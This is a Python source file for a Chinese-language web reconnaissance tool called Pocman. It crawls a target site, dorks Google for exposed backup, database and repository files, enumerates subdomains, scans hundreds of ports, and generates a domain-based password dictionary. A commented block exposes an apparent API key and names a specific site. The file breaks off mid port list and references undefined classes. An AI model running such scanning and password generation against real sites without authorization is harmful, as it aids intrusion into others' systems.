import os
import sys
import concurrent.futures
import socket
import getopt
import time
import http.cookies
import requests
import re
from concurrent.futures import ThreadPoolExecutor, as_completed, wait
import datetime
from fake_useragent import UserAgent
from tqdm import tqdm
from set.config import cms_patterns
import subprocess
from secrets import token_hex
import json
import random
import string
import base64
import urllib.parse
import dns.resolver
# from googleapiclient.discovery import build
import csv
from bs4 import BeautifulSoup
import openai


# 输出类
class OutPrint():
    def print_out(self, data):
        now = datetime.datetime.now()
        now_time = now.strftime("%H:%M:%S")
        print("[%s][*] %s" % (now_time, data))


# 主类
class Pocman():
    def __init__(self):
        self._ot = OutPrint()
        self._ua = UserAgent()
        self._main()

    def _banner(self):
        banner = """  
                  ██████╗  ██████╗  ██████╗ ███╔███╗  ██████╗ ███╗   ██╗
                  ██╔══██╗██╔═══██╗██╔════╝██║███╝██╗██╔═══██║████╗  ██║
                  ██████╔╝██║   ██║██║     ██║ █╝ ██║████████║██╔██╗ ██║ 
                  ██╔═══╝ ██║   ██║██║     ██║    ██║██╔═══██║██║╚██╗██║  
                  ██║     ╚██████╔╝╚██████╗██║    ██║██║   ██║██║ ╚████║   
                  ╚═╝      ╚═════╝  ╚═════╝╚═╝    ╚═╝╚═╝   ╚═╝╚═╝  ╚═══╝  
[WARING][*] 这仅仅是个开始                             脚本:aKyo        版本: v1.01.16  
@感谢:默,黄司机,Ahhzero
"""
        print(banner, end="")

    def _use(self):
        str = ":(\n[!]python pocman.py --target http://www.exmple.com/\n[!]python pocman.py -h or --help"
        print(str)

    def _help(self):
        self._banner()
        tips = """
    --target <url>            指定目标
    --cookie <cookie>         指定cookie,传入cookie值程序自动处理,例:PHPSESSID=xxxxxx; xxxxx=;
    --threads <thread>        指定线程/默认为10
    --agent <user-agent>      指定请求头,脚本默认随机请求头     注:请求头用引号括起来    
    --depth <depth>           指定深度，默认为1，只支持1和all，选择all会一直爬取到没有结果为止
    --no-ssl <ssl>            默认为Ture开启SSL验证，指定--no-ssl命令关闭验证
    --proxy <proxy>           指定代理,例:127.0.0.1:9527
    --no-domain <domain>      子域名枚举,默认开启子域名枚举，指定--no-domain命令关闭枚举
    --api-scan <api>          通过调用api信息收集子域名,默认开启，指定--api-scan命令只进行api信息收集,由于白嫖每天限制查询50
    --no-port <port>          通过requests进行端口收集,默认开启，指定--no-port命令关闭收集
    --openai-chat <OpenAI>    通过--openai-chat命令通过接口快速进行AI聊天，聊天过程输入exit退出聊天。如:python3 pocman.py --openai-chat 注:需要科学上网
            """
        print(tips)

    def _point_check(self, url, headers, cookie, verify, threads, proxy, depth):
        if url:
            self._ot.print_out(f"目标 : {url}")
        if cookie:
            self._ot.print_out(f"Cookie : {cookie}")
        if headers:
            self._ot.print_out(f"Header : {headers['User-Agent']}")
        # if verify:
        self._ot.print_out(f"SSL : {verify}")
        if threads:
            self._ot.print_out(f"线程 : {threads}")
        if proxy:
            ip = proxy['http']
            self._ot.print_out(f"代理 : {ip}")
        if depth:
            self._ot.print_out(f"深度 : {depth}")

    def _file_check(self):
        self._ot.print_out("检测并删除缓存文件，漏洞文件不会删除......")
        file_list = [
            './result/link.txt',
            './result/domain.txt',
            './result/db.txt',
            './result/svn.txt',
            './result/xml.txt',
            './result/js.txt',
            './result/domain_pwds.txt',
            './result/google_scan.txt',
            './result/domain_scan.csv',
            './result/api_domains.txt',
            './result/api_ips.txt',
            './result/web.txt',
        ]
        for link_path in file_list:
            if os.path.exists(link_path):
                os.unlink(link_path)
        self._ot.print_out("缓存文件删除完成")

    def _inputData(self, url, headers, cookie, verify, threads, proxy, depth):
        if url:
            url = url.strip('/ ')
            if url.count('/') >= 3:
                url = url.split('/')[0] + '//' + url.split('/')[2]
        else:
            sys.exit()
        if headers:
            headers = {"User-Agent": f"{headers}"}
        else:
            headers = {"User-Agent": self._ua.random}
        if cookie:
            cookie = http.cookies.SimpleCookie(cookie)
            for key, morsel in cookie.items():
                cookie[key] = morsel.value
        else:
            cookie = None
        if threads:
            threads = threads
        else:
            threads = 10
        if proxy:
            proxy = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
        else:
            proxy = None
        if depth:
            depth = depth
        else:
            depth = 1

        self._point_check(url, headers, cookie, verify, threads, proxy, depth)
        return url, headers, cookie, verify, threads, proxy, depth

    def _run(self):
        url = ''
        headers = ''
        cookie = ''
        verify = True
        threads = ''
        proxy = ''
        depth = ''
        domain = True
        api_scan = True
        ports = True
        openai = True
        try:
            opts, args = getopt.getopt(sys.argv[1:], "h", ["help", "target=", "threads=", "cookie=", "depth=", "agent=", "proxy=", "no-domain", "no-ssl", "api-scan", "no-port", "openai-chat"])
        except Exception as e:
            self._banner()
            self._use()
            sys.exit(1)
        if len(sys.argv) < 2 or len(sys.argv) > 15:
            self._banner()
            self._use()
            sys.exit()
        try:
            for opt, arg in opts:
                if opt in ("-h", "--help"):
                    print(1)
                    self._help()
                    sys.exit()
                elif opt == "--openai-chat":
                    openai = False

                elif opt == "--target":
                    url = arg.strip('/ ')
                    if not re.match(r"^https?://.*", url):
                        self._ot.print_out("缺少http服务头")
                        sys.exit(1)
                elif opt == "--cookie":
                    cookie = arg
                elif opt == "--threads":
                    threads = int(arg)
                elif opt == "--depth":
                    depth = arg
                elif opt == "--agent":
                    headers = arg
                elif opt == "--proxy":
                    proxy = arg
                elif opt == "--no-domain":
                    domain = False
                elif opt == "--api-scan":
                    api_scan = False
                elif opt == "--no-ssl":
                    verify = False
                elif opt == "--no-port":
                    ports = False

            self._banner()
            if not openai:
                OpenAi()
                sys.exit()
            self._ot.print_out("程序确认此次目标后会自动删除上次目标缓存文件，如有需要请单独保存:)")
            url, gl_headers, gl_cookie, gl_verify, gl_threads, gl_proxy, depth = self._inputData(url, headers, cookie, verify, threads, proxy, depth)
            return url, gl_headers, gl_cookie, gl_verify, gl_threads, gl_proxy, depth, domain, api_scan, ports
        except Exception as e:
            self._ot.print_out("[!] pocman.py -h or --help")
            sys.exit()

    def _main(self):
        global gl_headers
        global gl_verify
        global gl_cookie
        global gl_threads
        global now_time
        global gl_proxy
        global gl_domain
        global gl_api_scan
        global gl_ports
        now = datetime.datetime.now()
        now_time = now.strftime("%H:%M:%S")
        url, gl_headers, gl_cookie, gl_verify, gl_threads, gl_proxy, depth, gl_domain, gl_api_scan, gl_ports = self._run()
        if not gl_api_scan:
            Api(url)
            sys.exit()
        self._file_check()
        Info(url).main()
        Craw().url_code_link(url, depth)


# 爬虫类
class Craw:
    def __init__(self):
        self._ot = OutPrint()
        self._url_list = []
        self._domain_list = []
        self._svn_list = []
        self._db_list = []
        self._js_list = []
        self._xml_list = []
        self._depth_check = []
        self._depth_url_list = []
        self._visited_urls = set()

    def _txt_check(self):
        for res_url in self._url_list:
            if '.svn' in res_url:
                if res_url not in self._svn_list:
                    self._svn_list.append(res_url)
            elif '.db' in res_url:
                if res_url not in self._db_list:
                    self._db_list.append(res_url)
            elif '.js' in res_url:
                if res_url not in self._js_list:
                    self._js_list.append(res_url)
            elif '.xml' in res_url:
                if res_url not in self._xml_list:
                    self._xml_list.append(res_url)
        for url in self._svn_list:
            with open('./result/web_dir.txt', 'a') as w:
                w.write(url + '\n')
        for url in self._db_list:
            with open('./result/web_dir.txt', 'a') as w:
                w.write(url + '\n')
        for url in self._xml_list:
            with open('./result/web_dir.txt', 'a') as w:
                w.write(url + '\n')
        for url in self._js_list:
            with open('./result/web_dir.txt', 'a') as w:
                w.write(url + '\n')

    #  文本分类
    def _url_txt_check(self):
        with open('result/link.txt', 'a+') as w:
            for res_url in self._url_list:
                w.seek(0)
                text_content = w.read()
                if res_url not in text_content:
                    w.write(res_url + '\n')
        with open('result/domain.txt', 'a+') as w:
            for res_domain in self._domain_list:
                w.seek(0)
                text_content = w.read()
                if res_domain not in text_content:
                    w.write(res_domain + '\n')

    def _depth_url_check(self, url):
        self._webinfo(url)

    # 递归
    def _recurrence(self, url):
        self._visited_urls.add(url)
        try:
            res = requests.get(url=url, headers=gl_headers, cookies=gl_cookie, verify=gl_verify, timeout=5, proxies=gl_proxy)
            res.encoding = res.apparent_encoding
            if 'secretid' in res.text or 'accessKey' in res.text:
                with open('./result/keys.txt', 'a') as w:
                    w.write('找到可能存在AK或SK的关键词:' + url + '\n')
            rs = re.finditer('(https?|ftp|file)://[-A-Za-z0-9+&@#/%?=~_|!:,.;]+[-A-Za-z0-9+&@#/%=~_|]', res.text)
            for i in rs:
                self._depth_url_list.append(i.group())
        except Exception as e:
            pass
        if self._depth_url_list:
            futures = []
            with ThreadPoolExecutor(10) as pool:
                for urls in self._depth_url_list:
                    if urls not in self._visited_urls and urls.split('/')[2] == url.split('/')[2]:
                        self._visited_urls.add(urls)
                        self._url_list.append(urls)
                        # 如果想看结果可解开下面注释
                        # self._ot.print_out(urls)
                        futures.append(pool.submit(self._recurrence, urls))
            wait(futures)

    # 释放资源
    def _clean(self):
        self._url_list = []
        self._domain_list = []
        self._svn_list = []
        self._db_list = []
        self._js_list = []
        self._xml_list = []

    # 爬取链接
    def _webmap(self, url):
        try:
            res_sitemap = requests.get(url=url + "/sitemap.xml", headers=gl_headers, cookies=gl_cookie, verify=gl_verify, timeout=6, proxies=gl_proxy)
            res_sitemap.encoding = res_sitemap.apparent_encoding
            if res_sitemap.status_code == 200:
                sitemap_link = re.finditer('(https?|ftp|file)://[-A-Za-z0-9+&@#/%?=~_|!:,.;]+[-A-Za-z0-9+&@#/%=~_|]', res_sitemap.text)
                for sitemap_url in sitemap_link:
                    self._url_list.append(sitemap_url.group())
                    if sitemap_url.group().split('/')[2] != url.split('/')[2]:
                        self._domain_list.append(sitemap_url.group().split('/')[2])
        except Exception as e:
            pass
        try:
            res_robots = requests.get(url=url + "/robots.txt", headers=gl_headers, cookies=gl_cookie, verify=gl_verify, timeout=6, proxies=gl_proxy)
            res_robots.encoding = res_robots.apparent_encoding
            if res_robots.status_code == 200:
                robots_link = re.finditer('(https?|ftp|file)://[-A-Za-z0-9+&@#/%?=~_|!:,.;]+[-A-Za-z0-9+&@#/%=~_|]', res_robots.text)
                robots_link2 = re.finditer('Disallow: [-A-Za-z0-9+&@#/%?=~_|!:,.;]+[-A-Za-z0-9+&@#/%=~_|]', res_robots.text)
                for robots_url in robots_link:
                    self._url_list.append(robots_url.group())
                    if robots_url.group().split('/')[2] != url.split('/')[2]:
                        self._domain_list.append(robots_url.group().split('/')[2])
                for robots_url in robots_link2:
                    self._url_list.append(url + robots_url.group().split(':')[-1].strip())
        except Exception as e:
            pass

    def _webinfo(self, url):
        counts = url.count('/')
        check_domain = ['google.', 'baidu.', 'jd.', 'facebook.', 'youtube.', 'sitemaps.']
        try:
            response = requests.get(url=url, headers=gl_headers, cookies=gl_cookie, verify=gl_verify, timeout=6, proxies=gl_proxy)
            response.encoding = response.apparent_encoding
            if 'secretid' in response.text or 'accessKey' in response.text:
                with open('./result/keys.txt', 'a') as w:
                    w.write('找到可能存在AK或SK的关键词:' + url + '\n')
            if response.status_code == 200:
                response.encoding = response.apparent_encoding
                url_link2 = re.finditer('(https?|ftp|file)://[-A-Za-z0-9+&@#/%?=~_|!:,.;]+[-A-Za-z0-9+&@#/%=~_|]', response.text)
                url_link = re.finditer('href=".*?"|src=".*?"|srcset=".*?"', response.text)
                for res_link in url_link2:
                    if res_link.group() not in self._url_list:
                        self._url_list.append(res_link.group())
                    if res_link.group().split('/')[2] not in self._domain_list:
                        self._domain_list.append(res_link.group().split('/')[2])

                for response_data in url_link:
                    res = response_data.group().split('"', 1)[-1].strip('"')
                    if "://" in res:
                        pass
                        # self._url_list.append(res)
                        # domain = res.split('//', 1)[-1].split('/', 1)[0]
                        # if domain not in self._domain_list:
                        #     self._domain_list.append(domain)
                    if "//" in res and "://" not in res:
                        new_url = "https:" + res
                        self._url_list.append(new_url)
                        domain = new_url.split('//', 1)[-1].split('/', 1)[0]
                        if domain not in self._domain_list:
                            self._domain_list.append(domain)
                    elif res[0] == '/':
                        if counts < 3:
                            new_url = url + res
                            self._url_list.append(new_url)
                        else:
                            new_url = url.split('/', 3)[0] + '//' + url.split('/', 3)[2] + res
                            self._url_list.append(new_url)
                    elif res[0] != '/':
                        if counts < 3:
                            new_url = url + '/' + res
                            self._url_list.append(new_url)
                        else:
                            new_url = url.split('/', 3)[0] + '//' + url.split('/', 3)[2] + res
                            self._url_list.append(new_url)

        except Exception as e:
            pass

    def _dir_link(self, threads):
        self._ot.print_out("开始Google-Site返回链接目录链接枚举......")
        time.sleep(1)
        with tqdm(total=len(self._url_list), desc='目录链接枚举进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
            with ThreadPoolExecutor(threads) as pool:
                futures = [pool.submit(self._webinfo, url) for url in self._url_list]
                for future in futures:
                    future.result()
                    pbar.update(1)
            wait(futures)
            time.sleep(1)
        self._ot.print_out("目录链接枚举结束")

    def _code_means(self, url, flag=False):
        if not flag:
            self._webmap(url)
        self._webinfo(url)

    # def _google_dir_scan(self):
    #     # 定义API密钥和搜索引擎ID
    #     api_key = 'AIzaSyDuZluB_ohV2RJjc6M_l_3Yfr6XQnh0yQ4'
    #     cse_id = '45a47247536484941'
    #
    #     # 定义要搜索的关键词
    #     query = 'site:https://new.xingweiedu.com/ ext:aspx'
    #
    #     # 创建一个Google Custom Search API客户端对象
    #     service = build('customsearch', 'v1', developerKey=api_key)
    #
    #     # 定义每页显示的结果数量
    #     num_results_per_page = 10
    #
    #     # 定义要获取的页数
    #     num_pages = 2
    #
    #     # 定义startIndex参数的初始值
    #     start_index = 1
    #
    #     # 定义一个集合用于存储所有的链接
    #     urls = set()
    #     url_list = []
    #     # 循环获取前30页的搜索结果
    #     for i in range(num_pages):
    #         try:
    #             # 调用search()方法，搜索关键词，并将结果存储在变量result中
    #             result = service.cse().list(q=query, cx=cse_id, start=start_index, num=num_results_per_page).execute()
    #             res = result['items']
    #             for i in res:
    #                 if i['link'] not in url_list:
    #                     url_list.append(i['link'])
    #             # 更新startIndex参数的值
    #             start_index = start_index + num_results_per_page
    #         except Exception as e:
    #             pass
    #     # 遍历结果集
    #     for url in url_list:
    #         print(url)

    def _google_ext(self, url, dir):
        url_list = []
        try:
            r = requests.get(url, headers=gl_headers, timeout=5)
            r.encoding = r.apparent_encoding
            res = re.finditer('(https?|ftp|file)://[-A-Za-z0-9+&@#/%?=~_|!:,.;]+[-A-Za-z0-9+&@#/%=~_|]', r.text)
            for i in res:
                if dir in i.group() and i.group() not in url_list:
                    url_list.append(i.group().split(';')[0])
                    self._url_list.append(i.group().split(';')[0])

        except Exception as e:
            pass
        if url_list:
            for res in url_list:
                if res.split('/')[2] == url.split('/')[2]:
                    with open('./result/google_scan.txt', 'a') as w:
                        w.write(res + '\n')

    def _google_ext_work(self, url, threads):
        self._ot.print_out("开始进行Google-Site-Ext搜索......")
        self._ot.print_out("[*WARING*] 需开启代理才能正常执行Google搜索")
        self._ot.print_out("[*WARING*] 由于代理地区不同,若没得到数据可全局搜索www.google.com.hk更改Google地区")
        self._ot.print_out("[*WARING*] 因使用的免费版Google-Api-KEY,每日卡死100条,故放弃调用Google-Api,改用暴力爬虫")
        self._ot.print_out("[*WARING*] 因使用暴力爬虫Google会封IP,所有能拿到多少数据全看人品")
        self._ot.print_out("[*WARING*] 如若拥有Google-Api-KEY,可更改调用函数,全局搜索函数_google_dir_scan进行二次开发")
        domain = url
        ext_list = ['php', 'aspx', 'db', 'git', 'json', 'zip', 'bak', 'jsp', 'mdb', 'svn', 'jsp', 'cfm', 'dtd', 'xml']
        url_dict = {}
        for ext in ext_list:
            url = f"https://www.google.com.hk/search?q=site%3A{domain}/+ext%3A{ext}"
            url_dict['.' + ext] = url
        time.sleep(1)
        with tqdm(total=len(url_dict), desc='Google-Site-Ext进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
            with ThreadPoolExecutor(threads) as pool:
                time.sleep(1)
                try:
                    futures = [pool.submit(self._google_ext, value, key) for key, value in url_dict.items() if time.sleep(1) is None]
                except Exception as e:
                    pass
                for future in concurrent.futures.as_completed(futures):
                    future.result()
                    pbar.update(1)
            wait(futures)
        time.sleep(1)
        self._ot.print_out("Google-Site-Ext爬虫已完成")
        time.sleep(2)
        if self._url_list:
            self._dir_link(threads)

    # sitemap/robots/源码链接爬取，递归爬取
    def url_code_link(self, url, depth=1, flag=False):
        if depth == 1:
            #  Google_scan
            if url.count('/') >= 3:
                new_url = url.split('/')[0] + '//' + url.split('/')[2]
                self._google_ext_work(new_url, gl_threads)
            else:
                self._google_ext_work(url, gl_threads)
            # 链接整理
            self._code_means(url, flag)
            # 整理结果
            self._ot.print_out("开始整理URL返回结果......")
            self._url_txt_check()
            self._ot.print_out("URL返回结果整理完成")
            self._ot.print_out("URL数据分类......")
            self._txt_check()
            self._ot.print_out("URL数据分类完成")

        else:
            if url.count('/') >= 3:
                new_url = url.split('/')[0] + '//' + url.split('/')[2]
                self._google_ext_work(new_url, gl_threads)
            else:
                self._google_ext_work(url, gl_threads)
            # 递归           
            self._code_means(url, flag)
            self._ot.print_out("[*INFO*]因递归与进度条会起冲突,故选择不显示进度条")
            self._ot.print_out("[*WARING*] 脚本递归相对暴力,希望你明白其中利弊!!!")
            self._ot.print_out("开始进行递归爬取......")
            self._ot.print_out("递归时间取决与网站web信息多少")
            self._ot.print_out("递归会自动校验域名,规避误爬及旁站")
            self._ot.print_out("[*INFO*]耐心等待,递归耗时很长......")
            self._ot.print_out("[*INFO*]如果想查看爬取内容,全局搜索recurrence函数解开注释代码")
            self._recurrence(url)
            self._ot.print_out("URL递归爬取结束")
            self._ot.print_out("开始整理URL返回结果......")
            self._url_txt_check()
            self._ot.print_out("URL返回结果整理完成")
            self._ot.print_out("URL数据分类......")
            self._txt_check()
            self._ot.print_out("URL数据分类完成")
        if url.count('/') >= 3:
            new_url = url.split('/')[0] + '//' + url.split('/')[2]
            Pocs().main(new_url.strip(), gl_threads)
        else:
            Pocs().main(url.strip(), gl_threads)


# 网站信息类
class Info():
    def __init__(self, url):
        self._ot = OutPrint()
        self._url = url
        self._ports = []
        self._cms_patterns = cms_patterns

    # web服务信息
    def _init(self):
        try:
            res = requests.get(url=self._url, headers=gl_headers, cookies=gl_cookie, verify=gl_verify, timeout=10, proxies=gl_proxy)
            res_head = res.headers
            try:
                if 'PHPSESSID' in res_head['Set-Cookie']:
                    self._ot.print_out("编程语言为:php")

            except Exception as e:
                pass
            try:
                self._ot.print_out(f"中间件:{res.headers['Server']}")

            except Exception as e:
                self._ot.print_out("未找到中间件信息")

            try:
                self._ot.print_out(f"脚本语言:{res.headers['X-Powered-By']}")

            except Exception as e:
                self._ot.print_out("未找到脚本语言信息")

            try:
                if '(' in res_head['Server']:
                    res_ser = res_head['Server'].split('(')
                    self._ot.print_out(f"操作系统:{res_ser[-1].strip('()')}")

                elif 'IIS' in res_head['Server']:
                    self._ot.print_out("操作系统:windows")
                else:
                    self._ot.print_out("未找到系统信息")


            except Exception as e:
                self._ot.print_out("未找到系统信息")
            try:
                self._ot.print_out(f"CMS信息:{res.headers['X-Powered-CMS']}")

            except Exception as e:
                self._ot.print_out("未在服务信息找到CMS信息")

            if 'cloudflare' in res.text:
                self._ot.print_out("网站配置：cloudflare")

            try:
                self._ot.print_out(f"X-XSS-Protection配置:{res_head['X-XSS-Protection']}")

            except Exception as e:
                self._ot.print_out("未检测到X-XSS-Protection")
        except (requests.exceptions.ConnectTimeout, requests.exceptions.ProxyError, requests.exceptions.ReadTimeout, requests.exceptions.InvalidHeader) as e:
            self._ot.print_out(f"error:代理无法访问:(\n[!]{e}")
            sys.exit()

    def _cms(self):
        self._ot.print_out("开始检测CMS信息......")
        # 去重
        cms_patterns = list(set(self._cms_patterns))
        # 发送 HTTP GET 请求
        response = requests.get(url=self._url, headers=gl_headers, cookies=gl_cookie, verify=gl_verify, timeout=5, proxies=gl_proxy)
        # 获取响应内容
        content = response.content.decode('utf-8')
        # 遍历所有 CMS 特征，检查其是否出现在响应内容中
        for cms, pattern in cms_patterns:
            if pattern in content:
                self._ot.print_out(f"URL使用CMS: {cms}")
                # break  # 只输出第一个匹配的 CMS
        else:
            self._ot.print_out("URL未检测出已知CMS")

    # 真实IP验证
    # def _ip_adr(self, ip_list):
    #     ips = []
    #     nm = nmap.PortScanner()
    #     try:
    #         for ip in ip_list:
    #             result = nm.scan(hosts=ip, arguments='-sn')
    #             # 获取扫描结果
    #             for host in nm.all_hosts():
    #                 if nm[host]['status']['state'] == 'up':
    #                     self._ot.print_out("找到真实IP地址: {ip}")
    #                     ips.append(ip)
    #     except Exception as e:
    #         pass
    #     return ips
    # 查找ip
    def _ip_find(self):
        ip_list = []
        try:
            ip_list = socket.gethostbyname_ex(self._url.split('//')[-1])[2]
        except Exception as e:
            pass
        if ip_list:
            for ip_adr in ip_list:
                self._ot.print_out(f"找到IP地址: {ip_adr}")
        self._ot.print_out("[*INFO*] 因API问题暂时未能验证真实IP，注:104/108/172均为CDN")
        return ip_list

    # web端口信息
    def _ip_port(self, ip, port):
        result = []
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # 超时
        s.settimeout(0.5)
        # 发起请求
        try:
            if s.connect_ex((ip, port)) == 0:
                result.append(port)
                # 关闭连接
                s.close()
        except Exception as e:
            pass
        return result

    # 子域名接管
    def _check_subdomain_takeover(self):
        self._ot.print_out(f"检测是否存在子域名接管......")

        subdomain = self._url.split('/')[2]
        try:
            # 解析子域名的CNAME记录
            answers = dns.resolver.resolve(subdomain, "CNAME")
            cname_record = answers[0].to_text().strip(".")
            self._ot.print_out(f"{subdomain} 的 CNAME 记录指向: {cname_record}")

            try:
                # 解析规范名称的IP地址
                ip = dns.resolver.resolve(cname_record, "A")
                self._ot.print_out(f"{cname_record} 解析为 IP 地址: {ip[0].to_text()}")

            except dns.resolver.NXDOMAIN:
                self._ot.print_out(f"警告: {cname_record} 无法解析为 IP 地址。可能存在子域名接管风险。")

        except dns.resolver.NoAnswer:
            self._ot.print_out(f"{subdomain} 没有找到 CNAME 记录")

        except dns.resolver.NXDOMAIN:
            self._ot.print_out(f"子域名 {subdomain} 不存在。")

        except Exception as e:
            self._ot.print_out(f"error: {e}")

    # 社工密码
    def _split_and_recombine(self, domain, min_length=6, max_length=10):
        domain_parts = [domain[i: j] for i in range(len(domain)) for j in range(i + 1, len(domain) + 1) if '.' not in domain[i:j]]
        random.shuffle(domain_parts)

        password = ''
        while len(password) < min_length:
            password += random.choice(domain_parts)
            if len(password) > max_length:
                password = password[:max_length]
                break

        # 添加随机大写字母和特殊字符
        # uppercase_letter = random.choice(string.ascii_uppercase)
        # special_char = random.choice(string.punctuation.replace('.', ''))
        uppercase_letter = random.choice(string.ascii_uppercase)
        special_char = random.choice(['_', '*', '@'])

        insert_pos_upper = random.randint(0, len(password))
        password = password[:insert_pos_upper] + uppercase_letter + password[insert_pos_upper:]

        insert_pos_special = random.randint(0, len(password))
        password = password[:insert_pos_special] + special_char + password[insert_pos_special:]

        return password

    def _passwd(self, domain, min_length=6, max_length=10, num_results=50000):
        passwords = set()
        progress_bar = tqdm(total=num_results, desc="随机字典生成进度", bar_format="{l_bar}{bar:30}{r_bar}", colour='black')

        while len(passwords) < num_results:
            # 随机拆分重组域名
            password = self._split_and_recombine(domain, min_length, max_length)
            if len(password) <= max_length and password not in passwords:
                passwords.add(password)
                progress_bar.update(1)

        progress_bar.close()
        return list(passwords)[:num_results]

    def _save_passwords_to_file(self, passwords, filename):
        with open(filename, "w") as f:
            for password in passwords:
                f.write(password + '\n')

    def _passwd_work(self):
        self._ot.print_out("开始根据域名生成随机密码......")
        domain = self._url.split('/')[2].split('.')[0] + self._url.split('/')[2].split('.')[1]
        passwords = self._passwd(domain)
        self._save_passwords_to_file(passwords, "./result/domain_pwds.txt")
        self._ot.print_out(f"已将 {len(passwords)} 个密码保存到./result/domain_pwds.txt 文件中。")

    def _domain_scan(self, url):
        try:
            response = requests.get(url="https://" + url, headers=gl_headers, verify=gl_verify, timeout=5, proxies=gl_proxy)
            if response.status_code == 404 or response.status_code == 503:
                return
            else:
                # print(url)
                response.encoding = response.apparent_encoding
                ip_address = socket.gethostbyname(url)
                soup = BeautifulSoup(response.text, 'html.parser')
                title = soup.title.string
                contents = len(response.text)
                with open('./result/domain_scan.csv', 'a', newline='', encoding='utf-8') as f:
                    writer = csv.writer(f)
                    writer.writerow([url, ip_address, response.status_code, title, contents])
        except Exception as e:
            pass

    def _domain_scan_work(self):
        self._ot.print_out("开始枚举子域名......")
        counts = self._url.count('.')
        url_list = []
        if counts <= 2:
            demo_url = self._url.split('/')[2].split('.')
            url = demo_url[-2] + '.' + demo_url[-1]
            with open('./set/domain_scan.txt', encoding="utf-8") as f:
                for i in f:
                    if i:
                        url_list.append(i.strip() + '.' + url)
        else:
            demo_url = self._url.split('/')[2].split('.')
            url = demo_url[-3] + '.' + demo_url[-2] + '.' + demo_url[-1]
            with open('./set/domain_scan.txt', encoding="utf-8") as f:
                for i in f:
                    if i:
                        url_list.append(i.strip() + '.' + url)
        with tqdm(total=len(url_list), desc='子域名枚举进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
            with ThreadPoolExecutor(gl_threads) as pool:
                futures = [pool.submit(self._domain_scan, res_url) for res_url in url_list]
                for future in concurrent.futures.as_completed(futures):
                    future.result()
                    pbar.update(1)
            wait(futures)
        time.sleep(1)
        self._ot.print_out("子域名枚举结束")

    def _port_check(self, url):
        try:
            response = requests.get(url, headers=gl_headers, verify=gl_verify, timeout=5, proxies=gl_proxy)
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                title = soup.title.string
                contents = len(response.text)
                with open('./result/ports.csv', 'a', newline='', encoding='utf-8') as f:
                    writer = csv.writer(f)
                    writer.writerow([url, response.status_code, title, contents])

        except Exception as e:
            pass

    def _port(self):
        self._ot.print_out("开始网站端口检测......")
        port_list = [1521, 1630, 1158, 1433, 50000, 1527, 5432, 3306, 27017, 7474, 2181, 60000, 60010, 60020, 60030, 8080, 8085, 9090, 9095, 6379, 11211, 389, 636, 2888, 3888, 5672, 5671, 61616, 1883, 61613, 9200, 9300, 53, 123, 162, 179, 445, 1194, 1701, 1812, 5353, 7, 5555, 9, 13, 21, 22, 23, 25, 26, 37, 53, 79, 80, 81, 88, 106, 110, 111, 113, 119, 135, 139, 143, 144, 179, 199, 389, 427, 443, 444, 445, 465, 513, 514, 515, 543, 544, 548, 554, 587, 631, 646, 873, 888, 990, 993, 995, 1025, 1026, 1027, 1028, 1029, 1080, 1110, 1433, 1443, 1720, 1723, 1755, 1900, 2000, 2001, 2049, 2121, 2181, 2717, 3000, 3128, 3306, 3389, 3986, 4899, 5000, 5009, 5051, 5060, 5101, 5190, 5357, 5432, 5631, 5666, 5800, 5900, 6000, 6001, 6646, 7000, 7001, 7002, 7003, 7004, 7005, 7070, 8000, 8008, 8009, 8080, 8081, 8443, 8888, 9100, 9999, 10000, 11211, 32768, 49152, 49153, 49154, 49155, 49156, 49157, 8088, 9090, 8090, 8001, 82, 9080, 8082, 8089, 9000, 8002, 89, 8083, 8200, 90, 8086, 801, 8011, 8085, 9001, 9200,
                     8100, 2783,
                     8012, 85, 8084, 8070, 8091, 8003, 99, 7777, 8010, 8028, 8087, 83, 808, 38888, 8181, 800, 18080, 8099, 8899, 86, 8360, 8300, 8800, 8180, 3505, 9002, 8053, 1000, 7080, 8989, 28017, 9060, 8006, 41516, 880, 8484, 6677, 8016, 84, 7200, 9085, 5555, 8280, 1980, 8161, 9091, 7890, 8060, 6080, 8880, 8020, 889, 8881, 9081, 7007, 8004, 38501, 1010, 17, 19, 255, 1024, 1030, 1041, 1048, 1049, 1053, 1054, 1056, 1064, 1065, 1801, 2103, 2107, 2967, 3001, 3703, 5001, 5050, 6004, 8031, 10010, 10250, 10255, 6888, 87, 91, 92, 98, 1081, 1082, 1118, 1888, 2008, 2020, 2100, 2375, 3008, 6648, 6868, 7008, 7071, 7074, 7078, 7088, 7680, 7687, 7688, 8018, 8030, 8038, 8042, 8044, 8046, 8048, 8069, 8092, 8093, 8094, 8095, 8096, 8097, 8098, 8101, 8108, 8118, 8172, 8222, 8244, 8258, 8288, 8448, 8834, 8838, 8848, 8858, 8868, 8879, 8983, 9008, 9010, 9043, 9082, 9083, 9084, 9086, 9087, 9088, 9089, 9092, 9093, 9094, 9095, 9096, 9097, 9098, 9099, 9443, 9448, 9800, 9981, 9986, 9988, 9998, 10001, 10002,
                     10004,
                     8688, 1001, 58080, 1182, 9025, 8112, 7776, 7321, 235, 8077, 8500, 11347, 7081, 8877, 8480, 9182, 58000, 8026, 11001, 10089, 5888, 8196, 8078, 9995, 2014, 5656, 8019, 5003, 8481, 6002, 9889, 9015, 8866, 8182, 8057, 8399, 8308, 511, 12881, 4016, 1039, 28080, 5678, 7500, 8051, 18801, 15018, 15888, 38443, 8123, 9004, 8144, 94, 9070, 1800, 9112, 8990, 3456, 2051, 9131, 97, 7100, 7711, 7180, 11000, 8037, 6988, 122, 8885, 14007, 8184, 7012, 8079, 9888, 9301, 59999, 49705, 1979, 8900, 5080, 5013, 1550, 8844, 4850, 206, 5156, 8813, 3030, 1790, 8802, 9012, 5544, 3721, 8980, 10009, 8043, 8390, 7943, 8381, 8056, 7111, 1500, 5881, 9437, 5655, 8102, 65486, 4443, 3690, 10025, 8024, 8333, 8666, 103, 8, 9666, 8999, 9111, 8071, 522, 11381, 20806, 8041, 1085, 8864, 7900, 1700, 8036, 8032, 8033, 8111, 60022, 955, 3080, 8788, 27017, 7443, 8192, 6969, 9909, 5002, 9990, 188, 8910, 9022, 50030, 866, 8582, 4300, 9101, 6879, 8891, 4567, 4440, 10051, 10068, 50080, 8341, 30001, 6890, 8168,
                     8955, 65389, 1070, 1080, 1090, 888]
